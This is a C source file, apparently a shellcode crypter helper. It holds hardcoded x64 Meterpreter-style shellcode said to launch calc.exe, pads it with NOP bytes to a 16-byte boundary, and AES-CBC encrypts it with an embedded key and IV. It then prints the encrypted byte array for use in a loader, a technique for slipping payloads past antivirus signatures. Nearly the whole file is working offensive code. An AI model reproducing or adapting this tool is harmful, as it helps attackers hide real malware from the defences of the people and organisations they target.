#include <Windows.h>
#include <stdio.h>
#include "aes.h"


int roundUp(int numToRound, int multiple) {
	if (multiple == 0) {
		return numToRound;
	}
	int remainder = numToRound % multiple;
	if (remainder == 0) {
		return numToRound;
	}
	return numToRound + multiple - remainder;
}

int AESExample() {
	//273 is not multiple of 16 [272 is but i added 0x90 at the end to mess it up]
	// --- METERPRETER SHELLCODE: x64 (calc.exe) --- //
	unsigned char shellcode[] = {
		0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
		0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
		0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
		0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
		0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
		0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
		0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
		0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
		0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
		0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
		0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
		0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
		0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
		0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
		0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
		0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
		0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
		0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
		0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
		0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
		0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
		0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
		0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00, 0x90
	};

	SIZE_T shellcodeSize = sizeof(shellcode);
	SIZE_T finalshellcodeSize = 0;
	unsigned char Padd[16] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
	unsigned char Nop[1] = { 0x90 };

#define NEWSHELLCODELEN sizeof(shellcode) + 32         //size of new shellcode calculated
	unsigned char NewPaddedShellcode[NEWSHELLCODELEN]; //new shellcode padded

	//already multiple by 16 so we just add extra 16 bytes of nops
	if (shellcodeSize % 16 == 0) {
		printf("[i] The Shellcode is Already multiple of 16, Padding with 16 Nops Only \n");
		memcpy(NewPaddedShellcode, shellcode, shellcodeSize);
		memcpy(NewPaddedShellcode + shellcodeSize, Padd, sizeof(Padd));
		finalshellcodeSize = shellcodeSize + 16;
	}
	// it is not multiple of 16
	else {
		printf("[i] The Shellcode is Not multiple of 16\n");
		int MultipleBy16 = roundUp(shellcodeSize, 16); //calculating the `rounding up` number
		printf("[+] Constructing the Shellcode To Be Multiple Of 16, Target Size: %d \n", MultipleBy16);
		int HowManyToAdd = MultipleBy16 - shellcodeSize; //calculating how much we need to add to be multiple of 16
		memcpy(NewPaddedShellcode, shellcode, shellcodeSize); //adding the shellcode to our new shellcode to start the padding ...
		int i = 0;
		while (TRUE) {
			memcpy(NewPaddedShellcode + shellcodeSize + i, Nop, 1); //add 1 byte of 0x90 at the end till we reach our `HowManyToAdd` value
			if (i == HowManyToAdd) {
				break;
			}
			i++;
		}
		printf("[+] Added : %d \n", i);
		//printf("[+] Done, Shellcode Size is : %ld \n", shellcodeSize + i);
		printf("[+] Padding with Extra 16 Nops ...\n");
		memcpy(NewPaddedShellcode + shellcodeSize + i, Padd, sizeof(Padd)); // adding extra 16 bytes of nopes to the end
		finalshellcodeSize = shellcodeSize + i + 16; //setting the size
	}

	printf("[+] New Shellcode Size is : %ld \n", finalshellcodeSize);
	unsigned char key[] = "Captain.MeeloIsTheSuperSecretKey";
	// key should be 32 bytes
	unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
	// iv should be 16
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_encrypt_buffer(&ctx, NewPaddedShellcode, finalshellcodeSize);


	// if u prefer the shellcode to look like this : "\x00\x00\x00\x00", uncomment the following lines :

	//printf("\nunsigned char Encryptedbuffer [%ld] = \"", finalshellcodeSize);
	//for (int i = 0; i < finalshellcodeSize - 1; i++) {
	//	printf("\\x%02x", NewPaddedShellcode[i]);
	//}
	//printf("\"; \n");

	// this is how i like to print the shellcode :

	printf("\nunsigned char Encryptedbuffer[%ld] = {", finalshellcodeSize);
	printf("\t");
	for (int i = 0; i < finalshellcodeSize; i++) {
		if (i == finalshellcodeSize - 1) {
			printf("0x%02x ", NewPaddedShellcode[i]);
			break;
		}
		if (i % 16 == 0) {
			printf("\n\t");
		}
		printf("0x%02x, ", NewPaddedShellcode[i]);
	}
	printf("\n}; \n");
}